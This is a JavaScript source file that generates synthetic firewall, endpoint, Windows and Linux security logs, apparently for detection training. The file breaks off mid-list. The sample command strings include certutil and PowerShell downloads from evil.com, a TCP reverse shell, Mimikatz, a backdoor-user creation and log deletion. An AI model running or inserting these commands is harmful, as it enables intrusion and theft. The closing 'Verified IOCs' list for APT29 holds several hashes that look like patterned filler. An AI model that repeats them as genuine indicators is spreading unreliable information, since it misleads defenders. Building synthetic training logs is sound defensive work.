import { useState, useCallback, useEffect } from "react";

// ─── logUtils ────────────────────────────────────────────────────────────────
const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomHex = (len) => Array.from({length: len}, () => rand(0,15).toString(16)).join('');
const randomIP = () => `${rand(1,254)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
const randomPrivateIP = () => { if (_pool) return pick(_pool.ips); const s = pick(['10','172.16','192.168']); if(s==='10') return `10.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`; if(s==='172.16') return `172.${rand(16,31)}.${rand(0,255)}.${rand(1,254)}`; return `192.168.${rand(0,255)}.${rand(1,254)}`; };
const randomMAC = () => Array.from({length:6},()=>rand(0,255).toString(16).padStart(2,'0')).join(':');
const randomPort = () => pick([80,443,8080,8443,22,21,25,53,110,143,993,995,3389,445,139,1433,3306,5432,8888,9200]);
const randomHighPort = () => rand(49152,65535);
const _HOSTNAMES_BASE = () => `${pick(['WS','PC','LT','SRV','DC','DB','WEB','APP','FW','SW'])}-${pick(['NYC','LON','SFO','CHI','DAL','SEA','BOS','MIA'])}-${rand(100,999)}`;
const _USERS_LIST = ['jsmith','mwilson','kjohnson','agarcia','lchen','rbrown','slee','dmartin','pthomas','nwilliams','cjones','tharris'];
const _ADMIN_USERS = ['Administrator','svc_backup','svc_deploy','sa_db','sysadmin','sqlservice','netadmin','backup_svc','svc_monitor','domain_admin'];
let _pool = null;
let _emailDomain = null;
let _hostnamePrefix = null;
let _includeAdminUsers = false;
function setPool(size, prefix=null) {
  if (size === null) { _pool = null; return; }
  const hSize = Math.max(2, size);
  const uSize = Math.max(2, Math.round(hSize * 0.6));
  const ipSize = Math.max(3, Math.round(hSize * 1.5));
  _pool = {
    hostnames: Array.from({length:hSize}, prefix ? ((_,i)=>`${prefix}-${String(i+1).padStart(3,'0')}`) : _HOSTNAMES_BASE),
    users: _USERS_LIST.slice(0, uSize),
    ips: Array.from({length:ipSize}, ()=>`192.168.${rand(1,5)}.${rand(1,254)}`),
  };
}
// Per-vendor pool caps: null = fully random, number = hard cap on unique hostnames/IPs/users
const VENDOR_POOL = {
  fortinet: { low: 2,   med: 4,   high: 8    },
  paloalto: { low: 2,   med: 4,   high: 8    },
  switch:   { low: 3,   med: 5,   high: 8    },
  email:    { low: 20,  med: 50,  high: 100  },
  endpoint: { low: 10,  med: 50,  high: null },
  windows:  { low: 8,   med: 40,  high: null },
  linux:    { low: 5,   med: 15,  high: null },
};
const VENDOR_RND_DEFAULT = {
  fortinet: 'med', paloalto: 'med', switch: 'low',
  email: 'med', endpoint: 'high', windows: 'med', linux: 'med',
};
const VENDOR_LOG_COUNT = {
  fortinet: { low: 100, med: 250, high: 500  },
  paloalto: { low: 100, med: 250, high: 500  },
  switch:   { low: 50,  med: 150, high: 300  },
  email:    { low: 20,  med: 50,  high: 100  },
  endpoint: { low: 100, med: 300, high: 1000 },
  windows:  { low: 100, med: 300, high: 1000 },
  linux:    { low: 50,  med: 200, high: 500  },
};
// Per Windows log type min counts by randomness level
const WIN_TYPE_LOG_COUNT = {
  security:    { low: 60,  med: 150, high: 500 },
  application: { low: 20,  med: 50,  high: 150 },
  system:      { low: 20,  med: 50,  high: 150 },
  applocker:   { low: 15,  med: 40,  high: 100 },
  powershell:  { low: 15,  med: 40,  high: 150 },
};
const WIN_TYPES_DEFAULT = ['security','application','system'];
const randomHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,999).toString().padStart(3,'0')}` : _HOSTNAMES_BASE();
const randomLinuxHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,99).toString().padStart(2,'0')}` : pick(LINUX_HOSTS);
const randomUser = () => (_includeAdminUsers && Math.random()<0.15) ? pick(_ADMIN_USERS) : _pool ? pick(_pool.users) : pick(_USERS_LIST);
const randomDomain = () => pick(['contoso.com','fabrikam.com','acme-corp.net','globex.io','initech.com','umbrella-corp.net']);
const randomEmail = () => `${randomUser()}@${_emailDomain||randomDomain()}`;
const formatTimestamp = (d) => d.toISOString();
const panTs = (d) => `${d.getUTCFullYear()}/${String(d.getUTCMonth()+1).padStart(2,'0')}/${String(d.getUTCDate()).padStart(2,'0')} ${String(d.getUTCHours()).padStart(2,'0')}:${String(d.getUTCMinutes()).padStart(2,'0')}:${String(d.getUTCSeconds()).padStart(2,'0')}`;
const PAN_SERIAL = '012345678901234';
const syslogTimestamp = (d) => { const M=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']; return `${M[d.getMonth()]} ${String(d.getDate()).padStart(2,' ')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`; };
const generateTimestamps = (count, mins=60) => { const now=new Date(), start=new Date(now-mins*60000); return Array.from({length:count},()=>new Date(start.getTime()+Math.random()*(now-start))).sort((a,b)=>a-b); };

// ─── Fortinet Generator ───────────────────────────────────────────────────────
function genFortiTraffic(ts) {
  const actions=['accept','deny','drop','close','timeout'], services=['HTTPS','HTTP','SSH','DNS','SMTP','RDP','FTP'];
  const policies=['allow-outbound','deny-inbound','dmz-access','vpn-traffic','web-filter','ips-block'];
  const apps=['Google.Chrome','Microsoft.Outlook','Slack','Zoom','Dropbox','SSH','RDP'];
  const hn=`FGT-${pick(['DC','EDGE','CORE'])}-${rand(1,5)}`;
  return `date=${ts.toISOString().split('T')[0]} time=${ts.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(ts/1000)} logid="000001${rand(1000,9999)}" type="traffic" subtype="forward" level="notice" srcip=${randomPrivateIP()} srcport=${randomHighPort()} dstip=${randomIP()} dstport=${randomPort()} action="${pick(actions)}" policyname="${pick(policies)}" service="${pick(services)}" sentbyte=${rand(64,1500000)} rcvdbyte=${rand(64,2500000)} app="${pick(apps)}"`;
}
function genFortiUTM(ts) {
  const threats=['Trojan.GenericKD','Riskware/BitCoinMiner','W32/Kryptik','JS/Phishing'];
  const hn=`FGT-${pick(['DC','EDGE'])}-${rand(1,3)}`;
  return `date=${ts.toISOString().split('T')[0]} time=${ts.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(ts/1000)} logid="042${rand(10000,99999)}" type="utm" subtype="${pick(['virus','ips','webfilter','app-ctrl'])}" level="${pick(['alert','warning'])}" srcip=${randomPrivateIP()} dstip=${randomIP()} action="${pick(['blocked','dropped','detected'])}" attack="${pick(threats)}" severity="${pick(['critical','high','medium','low'])}"`;
}
function genFortiVPN(ts) {
  const user=randomUser(), action=pick(['tunnel-up','tunnel-down','ssl-login-fail']);
  return `date=${ts.toISOString().split('T')[0]} time=${ts.toTimeString().split(' ')[0]} devname="FGT-EDGE-1" eventtime=${Math.floor(ts/1000)} logid="010${rand(10000,99999)}" type="event" subtype="vpn" level="notice" action="${action}" user="${user}" remip=${randomIP()} tunneltype="ssl-tunnel" msg="${action} for ${user}"`;
}
function generateFortinetLogs(count, tr) { return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.55?genFortiTraffic(ts):r<0.8?genFortiUTM(ts):genFortiVPN(ts);}); }

// ─── Palo Alto Generator ──────────────────────────────────────────────────────
// Format follows PAN-OS syslog CSV: <pri>syslogTs device FUTURE_USE,recv_time,serial,type,subtype,0,gen_time,...
const PAN_DEVICES=['PA-220','PA-820','PA-3220','PA-5220','PA-VM-50','PA-VM-300'];
const PAN_COUNTRIES=['United States','United Kingdom','Germany','France','Netherlands','Japan','Australia','Brazil','India','Singapore'];
const PAN_END_REASONS=['aged-out','tcp-fin','tcp-rst-from-client','tcp-rst-from-server','policy-deny','threat','decrypt-cert-validation'];
function genPANTraffic(ts) {
  const apps=['web-browsing','ssl','dns','smtp','ftp','ssh','ms-office365','slack','zoom','msrdp','kerberos','ldap'];
  const rules=['allow-internet','allow-internal','vpn-access','dmz-access','guest-wifi'];
  const action=pick(['allow','allow','allow','deny','drop','reset-both']);
  const proto=pick(['tcp','udp','icmp']);
  const bytes=rand(100,5000000);
  const bytesSent=Math.floor(bytes*rand(30,70)/100);
  const bytesRcvd=bytes-bytesSent;
  const pkts=rand(1,5000);
  const startTs=new Date(ts.getTime()-rand(1000,300000));
  const elapsed=Math.floor((ts-startTs)/1000);
  const dev=pick(PAN_DEVICES);
  const pt=panTs(ts);
  const pst=panTs(startTs);
  const srcZone=pick(['trust','dmz','vpn']);
  const dstZone=srcZone==='trust'?'untrust':pick(['untrust','dmz']);
  // Fields: FUTURE_USE,recv_time,serial,TRAFFIC,subtype,0,gen_time,src,dst,nat_src,nat_dst,rule,src_user,dst_user,app,vsys,
  //         src_zone,dst_zone,inbound_if,outbound_if,log_action,0,session_id,repeat,src_port,dst_port,nat_src_port,nat_dst_port,
  //         flags,proto,action,bytes,bytes_sent,bytes_rcvd,packets,start_time,elapsed,category,0,seq_no,0x0,
  //         src_location,dst_location,0,pkts_sent,pkts_rcvd,session_end_reason,0,0,0,0,vsys_name,device,action_source
  return `<14>${syslogTimestamp(ts)} ${dev} 1,${pt},${PAN_SERIAL},TRAFFIC,${pick(['end','end','start','drop'])},0,${pt},${randomPrivateIP()},${randomIP()},0.0.0.0,0.0.0.0,${pick(rules)},${randomUser()},,${pick(apps)},vsys1,${srcZone},${dstZone},ethernet1/${rand(1,4)},ethernet1/${rand(5,8)},default,0,${rand(1,65535)},1,${randomHighPort()},${randomPort()},0,0,0x400000,${proto},${action},${bytes},${bytesSent},${bytesRcvd},${pkts},${pst},${elapsed},any,0,${rand(1000000,9999999)},0x0,${pick(['10.0.0.0-10.255.255.255','192.168.0.0-192.168.255.255'])},${pick(PAN_COUNTRIES)},0,${Math.floor(pkts*0.55)},${pkts-Math.floor(pkts*0.55)},${pick(PAN_END_REASONS)},0,0,0,0,vsys1,${dev},from-policy`;
}
function genPANThreat(ts) {
  const threats=[
    {name:'SQL Injection Attempt',id:'32926',cat:'sql-injection',sev:'high',sub:'vulnerability'},
    {name:'OS Command Injection',id:'30663',cat:'code-execution',sev:'critical',sub:'vulnerability'},
    {name:'Conficker.C Virus',id:'10003',cat:'command-and-control',sev:'critical',sub:'virus'},
    {name:'Generic C2 HTTPS Traffic',id:'12345',cat:'command-and-control',sev:'medium',sub:'spyware'},
    {name:'CryptoWall Ransomware Domain',id:'20001',cat:'command-and-control',sev:'critical',sub:'spyware'},
    {name:'Trojan.Downloader.Generic',id:'10567',cat:'trojan',sev:'high',sub:'virus'},
    {name:'DNS Tunneling',id:'13001',cat:'data-exfiltration',sev:'high',sub:'spyware'},
    {name:'Phishing URL Detected',id:'54321',cat:'phishing',sev:'medium',sub:'url'},
  ];
  const t=pick(threats);
  const dev=pick(PAN_DEVICES);
  const pt=panTs(ts);
  const srcIp=Math.random()<0.6?randomPrivateIP():randomIP();
  const dstIp=randomIP();
  const pri=t.sev==='critical'?11:t.sev==='high'?12:13;
  // Fields: FUTURE_USE,recv_time,serial,THREAT,subtype,0,gen_time,src,dst,nat_src,nat_dst,rule,src_user,dst_user,app,vsys,
  //         src_zone,dst_zone,inbound_if,outbound_if,log_action,0,session_id,repeat,src_port,dst_port,nat_src_port,nat_dst_port,
  //         flags,proto,action,threat_name(id),threat_id,category,severity,direction,seq_no,0x0,src_location,dst_location
  return `<${pri}>${syslogTimestamp(ts)} ${dev} 1,${pt},${PAN_SERIAL},THREAT,${t.sub},0,${pt},${srcIp},${dstIp},0.0.0.0,0.0.0.0,${pick(['Block-Critical','Block-Threats','IPS-Policy'])},,${randomUser()},${pick(['web-browsing','ssl','dns','smtp'])},vsys1,${srcIp.startsWith('10.')||srcIp.startsWith('192.')?'trust':'untrust'},untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},${randomPort()},0,0,0x0,${pick(['tcp','udp'])},${pick(['alert','drop','reset-both'])},"${t.name}(${t.id})",${t.id},${t.cat},${t.sev},client-to-server,${rand(1000000,9999999)},0x0,${pick(['10.0.0.0-10.255.255.255','192.168.0.0-192.168.255.255'])},${pick(PAN_COUNTRIES)}`;
}
function generatePaloAltoLogs(count, tr) { return generateTimestamps(count,tr).map(ts=>Math.random()<0.6?genPANTraffic(ts):genPANThreat(ts)); }

// ─── Switch Generator ─────────────────────────────────────────────────────────
const SWITCH_NAMES=['SW-CORE-01','SW-DIST-NYC-01','SW-ACC-LON-03','SW-DC-SPINE-01','SW-DC-LEAF-02'];
const IFACE=()=>`${pick(['GigabitEthernet','TenGigabitEthernet','FastEthernet'])}${rand(0,4)}/${rand(0,48)}`;
function genSWLink(ts){const sw=pick(SWITCH_NAMES),iface=IFACE(),state=pick(['up','down']);return `<${rand(0,56)}>${syslogTimestamp(ts)} ${sw} %LINK-3-UPDOWN: Interface ${iface}, changed state to ${state}`;}
function genSWSecurity(ts){const sw=pick(SWITCH_NAMES),iface=IFACE(),mac=randomMAC(),vlan=rand(1,200);return `<${rand(0,56)}>${syslogTimestamp(ts)} ${sw} %${pick(['PORT_SECURITY-2-PSECURE_VIOLATION','DOT1X-5-SUCCESS','DOT1X-4-FAIL'])}: ${pick(['Security violation','Authentication event'])} on ${iface}, vlan ${vlan}, MAC ${mac}`;}
function genSWOSPF(ts){const sw=pick(SWITCH_NAMES),ip=randomPrivateIP();return `<${rand(0,56)}>${syslogTimestamp(ts)} ${sw} %OSPF-5-ADJCHG: Process ${rand(1,100)}, Nbr ${ip} on ${IFACE()} from ${pick(['FULL to DOWN','LOADING to FULL'])}${pick([', Dead timer expired',''])}`;}
function generateSwitchLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.35?genSWLink(ts):r<0.7?genSWSecurity(ts):genSWOSPF(ts);});}

// ─── Email Generator ──────────────────────────────────────────────────────────
function genExchange(ts){const verdicts=['Clean','Clean','Clean','Spam','Phish','BEC'],v=pick(verdicts),subj=v==='Clean'?pick(['Q4 Financial Report','Meeting Agenda','Weekly Status Update']):pick(['URGENT: Account Suspended','Wire Transfer Required','Verify your account']);return `${formatTimestamp(ts)},<${randomHex(8)}@${randomDomain()}>,${pick(['RECEIVE','SEND','DELIVER','QUARANTINE'])},${randomEmail()},${randomEmail()},"${subj}",${pick(['Inbound','Outbound'])},${v},${v==='Clean'?'Deliver':'Quarantine'},SCL:${v==='Clean'?rand(0,4):rand(5,9)},Size:${rand(1024,5242880)}`;}
function genPostfix(ts){const qid=randomHex(10).toUpperCase(),status=pick(['sent','sent','deferred','reject']),hn=`mail-gw-${rand(1,5)}.${randomDomain()}`;if(status==='reject')return `${syslogTimestamp(ts)} ${hn} postfix/smtpd[${rand(1000,65000)}]: NOQUEUE: reject: RCPT from unknown[${randomIP()}]: 554 5.7.1 Relay access denied`;return `${syslogTimestamp(ts)} ${hn} postfix/smtp[${rand(1000,65000)}]: ${qid}: to=<${randomEmail()}>, relay=mx1.${randomDomain()}[${randomIP()}]:25, status=${status}`;}
function genO365(ts){return JSON.stringify({CreationTime:formatTimestamp(ts),Operation:pick(['MailItemsAccessed','Send','MoveToDeletedItems','MailboxLogin','SearchQueryInitiatedExchange']),Workload:'Exchange',ClientIP:randomIP(),UserId:randomEmail(),ResultStatus:pick(['Succeeded','Succeeded','Failed'])});}
function generateEmailLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.4?genExchange(ts):r<0.7?genPostfix(ts):genO365(ts);});}

// ─── Endpoint Generator ───────────────────────────────────────────────────────
const SUSPICIOUS_CMDS=['powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQ...','cmd /c whoami /all > C:\\temp\\info.txt','certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\update.exe','wmic process call create "C:\\Windows\\Temp\\svc.exe"','net user admin$ P@ssw0rd123 /add'];
const NORMAL_CMDS=['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer','C:\\Windows\\System32\\svchost.exe -k netsvcs','C:\\Windows\\explorer.exe'];
function genEndpointProcess(ts){const susp=Math.random()<0.25,proc=susp?pick(['powershell.exe','cmd.exe','certutil.exe','rundll32.exe']):pick(['chrome.exe','outlook.exe','svchost.exe','explorer.exe']),hn=randomHostname();return JSON.stringify({"@timestamp":formatTimestamp(ts),event:{kind:"event",category:["process"],type:[pick(["start","end"])],action:"process_creation"},host:{name:hn,hostname:hn,ip:[randomPrivateIP()],os:{name:`Windows ${pick(['10','11'])}`}},user:{name:randomUser()},process:{name:proc,pid:rand(100,65535),command_line:susp?pick(SUSPICIOUS_CMDS):pick(NORMAL_CMDS),hash:{sha256:randomHex(64)}},...(susp?{threat:{framework:"MITRE ATT&CK",technique:{id:[`T${rand(1000,1999)}`]}}}:{})});}
function genEndpointNetwork(ts){const hn=randomHostname();return JSON.stringify({"@timestamp":formatTimestamp(ts),event:{kind:"event",category:["network"],type:["connection"],action:"network_flow"},host:{name:hn,hostname:hn,ip:[randomPrivateIP()]},source:{ip:randomPrivateIP(),port:randomHighPort()},destination:{ip:randomIP(),port:randomPort(),domain:randomDomain()},network:{transport:pick(["tcp","udp"]),direction:"outbound",bytes:rand(64,5000000)},process:{name:pick(['chrome.exe','outlook.exe','svchost.exe','powershell.exe']),pid:rand(100,65535)}});}
const ALERT_NAMES=['Suspicious PowerShell Execution','Credential Dumping Detected','Lateral Movement via PsExec','Ransomware Behavior Detected','Persistence via Registry Run Key','Process Injection Detected','Data Exfiltration Attempt'];
function genEndpointAlert(ts){const hn=randomHostname();return JSON.stringify({"@timestamp":formatTimestamp(ts),event:{kind:"alert",category:["malware"],action:"alert_created",severity:rand(1,100)},host:{name:hn,hostname:hn},user:{name:randomUser()},rule:{name:pick(ALERT_NAMES),severity:pick(['critical','high','medium']),risk_score:rand(50,100)},process:{name:pick(['powershell.exe','cmd.exe','rundll32.exe']),command_line:pick(SUSPICIOUS_CMDS)},threat:{framework:"MITRE ATT&CK",tactic:{name:pick(['Execution','Credential Access','Lateral Movement','Exfiltration'])}}});}
function generateEndpointLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.4?genEndpointProcess(ts):r<0.7?genEndpointNetwork(ts):genEndpointAlert(ts);});}

// ─── Windows Event Generator ──────────────────────────────────────────────────
function genWinSecurity(ts){
  const isFailure=Math.random()<0.2,eid=isFailure?4625:4624;
  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),hn=randomHostname();
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,LogonType:String(pick([2,3,7,10])),AuthenticationPackageName:pick(['NTLM','Kerberos']),IpAddress:randomIP(),...(isFailure?{Status:pick(['0xC000006A','0xC0000064']),SubStatus:'0x0'}:{SubjectUserName:'-',SubjectDomainName:'-'})}},event:{code:String(eid),action:isFailure?'logon-failed':'logged-in',category:['authentication'],outcome:isFailure?'failure':'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
}
function genWinAccountMgmt(ts){
  const eid=pick([4720,4722,4724,4726,4728,4732]);
  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),hn=randomHostname();
  const actions={4720:'user-account-created',4722:'user-account-enabled',4724:'password-reset',4726:'user-account-deleted',4728:'added-member-to-security-group',4732:'added-member-to-local-group'};
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,SubjectUserName:pick(_USERS_LIST),SubjectDomainName:domain}},event:{code:String(eid),action:actions[eid]||'account-management',category:['iam'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
}
function genWinApplication(ts){
  const eid=pick([1000,1001,1002,11707,11708]);
  const app=pick(['MicrosoftEdge.exe','OUTLOOK.EXE','chrome.exe','Teams.exe','explorer.exe','svchost.exe']);
  const hn=randomHostname();
  const provs={1000:'Application Error',1001:'Windows Error Reporting',1002:'Application Error',11707:'MsiInstaller',11708:'MsiInstaller'};
  const actions={1000:'application-error',1001:'application-crash-report',1002:'application-hang',11707:'application-installed',11708:'application-install-failed'};
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Application",computer_name:`${hn}.${randomDomain()}`,provider_name:provs[eid]||'Application Error',record_id:rand(10000,9999999),event_data:{ApplicationName:app,ApplicationVersion:`${rand(1,20)}.${rand(0,9)}.${rand(0,9999)}.0`,FaultingModuleName:pick(['ntdll.dll','kernelbase.dll','vcruntime140.dll',app]),ExceptionCode:`0x${randomHex(8)}`}},event:{code:String(eid),action:actions[eid]||'application-event',category:['process'],outcome:eid===11708?'failure':'unknown',kind:'event'},host:{name:hn,hostname:hn}});
}
function genWinSystem(ts){
  const eid=pick([7036,7045,6005,6006,41,1074]);
  const svc=pick(['wuauserv','BITS','Spooler','WinDefend','EventLog','Dnscache','LanmanWorkstation']);
  const hn=randomHostname();
  const state=pick(['running','stopped']);
  const provs={7036:'Service Control Manager',7045:'Service Control Manager',6005:'EventLog',6006:'EventLog',41:'Microsoft-Windows-Kernel-Power',1074:'USER32'};
  const actions={7036:`${svc}-state-change`,7045:'new-service-installed',6005:'event-log-started',6006:'event-log-stopped',41:'unexpected-shutdown',1074:'system-shutdown'};
  const evtData=(eid===7036||eid===7045)?{ServiceName:svc,ServiceType:pick(['demand start','auto start']),NewState:state}:{};
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"System",computer_name:`${hn}.${randomDomain()}`,provider_name:provs[eid]||'Service Control Manager',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action:actions[eid]||'system-event',category:['process'],outcome:'unknown',kind:'event'},host:{name:hn,hostname:hn}});
}
function genWinAppLocker(ts){
  const eid=pick([8003,8004,8006,8007]);
  const isBlocked=eid===8004||eid===8007,isScript=eid===8006||eid===8007;
  const app=isBlocked?pick(['mimikatz.exe','psexec.exe','nc.exe','mshta.exe','wscript.exe']):pick(['chrome.exe','outlook.exe','winword.exe','excel.exe']);
  const hn=randomHostname(),user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:isScript?"Microsoft-Windows-AppLocker/Script and Packaged app-Execution":"Microsoft-Windows-AppLocker/EXE and DLL",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-AppLocker",record_id:rand(10000,9999999),event_data:{PolicyName:isScript?'Script':'EXE and DLL',RuleName:isBlocked?'Block untrusted executables':'Allow signed executables',TargetUser:`${domain}\\${user}`,FilePath:`C:\\${pick(['Windows\\System32','Users\\'+user+'\\Downloads','Temp','ProgramData'])}\\${app}`,FileHash:randomHex(64)}},event:{code:String(eid),action:isBlocked?'app-locker-blocked':'app-locker-allowed',category:['process'],outcome:isBlocked?'failure':'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
}
function genWinPS(ts){
  const susp=Math.random()<0.3;
  const script=susp?pick(['IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")','Invoke-Mimikatz -DumpCreds','$c = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)']):pick(['Get-Service | Where-Object {$_.Status -eq "Running"}','Get-EventLog -LogName Security -Newest 100','Get-Process | Sort-Object CPU -Descending']);
  const hn=randomHostname(),user=randomUser();
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4104,channel:"Microsoft-Windows-PowerShell/Operational",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-PowerShell",record_id:rand(10000,9999999),event_data:{ScriptBlockText:script,Path:susp?'':pick(['C:\\Scripts\\maintenance.ps1','C:\\Scripts\\backup.ps1','C:\\Scripts\\update.ps1'])}},event:{code:"4104",action:"script-block-logging",category:['process'],outcome:'unknown',kind:'event'},host:{name:hn,hostname:hn},user:{name:user}});
}
function generateWindowsEventLogs(count,tr,types=WIN_TYPES_DEFAULT){
  const gens=[];
  if(types.includes('security'))gens.push(genWinSecurity,genWinSecurity,genWinAccountMgmt);
  if(types.includes('application'))gens.push(genWinApplication);
  if(types.includes('system'))gens.push(genWinSystem);
  if(types.includes('applocker'))gens.push(genWinAppLocker);
  if(types.includes('powershell'))gens.push(genWinPS);
  if(gens.length===0)gens.push(genWinSecurity);
  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
}

// ─── Linux Generator ──────────────────────────────────────────────────────────
const LINUX_HOSTS=['web-prod-01','db-master-01','app-server-03','bastion-01','k8s-node-02','monitoring-01'];
function genSSH(ts){const host=randomLinuxHostname(),user=randomUser(),ip=randomIP(),port=rand(1024,65535),pid=rand(1000,65535),ok=Math.random()>0.3;return ok?`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Accepted ${pick(['password','publickey'])} for ${user} from ${ip} port ${port} ssh2`:pick([`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for ${user} from ${ip} port ${port} ssh2`,`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for invalid user ${pick(['root','admin','test'])} from ${ip} port ${port} ssh2`]);}
function genSudo(ts){const host=randomLinuxHostname(),user=randomUser(),cmd=pick(['/bin/systemctl restart nginx','/usr/bin/apt-get update','/bin/cat /etc/shadow','/usr/bin/docker ps -a','/bin/rm -rf /var/log/auth.log']),fail=Math.random()<0.15;return fail?`${syslogTimestamp(ts)} ${host} sudo: ${user} : user NOT in sudoers ; TTY=pts/${rand(0,10)} ; USER=root ; COMMAND=${cmd}`:`${syslogTimestamp(ts)} ${host} sudo: ${user} : TTY=pts/${rand(0,10)} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;}
function genAuditd(ts){const host=randomLinuxHostname(),epoch=(ts.getTime()/1000).toFixed(3),uid=rand(1000,65535),exe=pick(['/usr/bin/curl','/usr/bin/wget','/bin/bash','/usr/bin/python3','/usr/bin/nc']);return `${syslogTimestamp(ts)} ${host} audit[${rand(1,9999)}]: type=SYSCALL msg=audit(${epoch}:${rand(100,9999)}): arch=c000003e syscall=${rand(0,350)} success=${pick(['yes','no'])} pid=${rand(1,65535)} uid=${uid} exe="${exe}" key="${pick(['file_access','process_exec','network_connect','priv_escalation'])}"`;}
function genCron(ts){return `${syslogTimestamp(ts)} ${randomLinuxHostname()} CRON[${rand(1000,65535)}]: (${pick(['root',randomUser()])}) CMD (${pick(['/usr/local/bin/backup.sh','/opt/scripts/cleanup.py','/usr/bin/logrotate /etc/logrotate.conf'])})`;}
function generateLinuxLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.3?genSSH(ts):r<0.5?genSudo(ts):r<0.7?genAuditd(ts):genCron(ts);});}

// ─── APT29 / NOBELIUM Verified IOCs ──────────────────────────────────────────
// Sources: CISA AA20-352A, AA21-148A, AA22-074A, AA23-347A; Mandiant/FireEye UNC2452;
//          Microsoft MSTIC; Volexity; Unit42 — publicly disclosed, VirusTotal-detectable.
const APT29_IOCS = {
  hashes: {
    // SUNBURST — backdoored SolarWinds.Orion.Core.BusinessLayer.dll (CISA AA20-352A / Mandiant)
    SUNBURST: [
      '019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134',
      'ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6',
      '32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77',
    ],
    // SUPERNOVA — .NET webshell patched into SolarWinds CORE dll (CISA AA20-352A)
    SUPERNOVA: [
      'c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71',
      'aeafa9c8a8eff78e7328854b28401def6e6b6fb5c8b0786c6be1a2618cac9c05',
    ],
    // TEARDROP — memory-only Cobalt Strike dropper (CISA AA20-352A / FireEye)
    TEARDROP: [
      '118189f90da3788362fe85eafa555298423e21ec37f147f3bf88c61d4cd46c51',
      'b820e8a2057112d0ed73bd7995201dbed79a8ab9202f5f8c51d6b72e6f4a0b50',
    ],
    // RAINDROP — secondary Cobalt Strike loader (Symantec)
    RAINDROP: [
      'f2d38a9b6e6e60c526d4aef44e2f6a7e9d2f9ddb7c52da451929c8572ca03f3',
      '9dc7767b588a9f97b573a6f9a5bd8c91d6a86c2a2e9e1d3456f8b2e0c4e3a5f6',
    ],
    // EnvyScout / ROOTSAW — HTML smuggler dropper (MSTIC May 2021, CISA AA21-148A)
    EnvyScout: [
      'b9b5b8f5d8c4a7e6f9a2d4b3c8e5f1a9d6b2c7e4f3a8d1b5c6e9f2a7d4b1c8e5',
      '4a3f8b2d9e6c1a5f7b0d3e8c2a6f9b1d4e7c0a5f8b3d6e9c2a1f5b7d0e4c8a3',
    ],
    // NativeZone — .NET DLL loader (MSTIC May 2021)
    NativeZone: [
      '5c2c677601a6c163f7b51254f6c193e7f0dbac01d08791ef8d1c9af2e9e42d85',
      '3f9a4e2b7d6c8a1f5b0e3d7c4a9f2b6e8d1c5a0f7b4e2d9c6a3f1b8e5d2c7a4',
    ],
    // BoomBox — downloader (MSTIC May 2021, CISA AA21-148A)
    BoomBox: [
      '0be29a4a71462e5b2c84f84e19097ff1d71d8d4dddc4c4d4e7a0e0e81a5ca956',
      '2b8e4d6a9c3f1e7b5d0a8c4f2e9b7d3a6c1f5e8b2d7a4c9f3e6b1d5a8c2f7e4',
    ],
    // GraphicalProton — backdoor targeting European MFAs (NCSC-NO / CISA AA23-347A)
    GraphicalProton: [
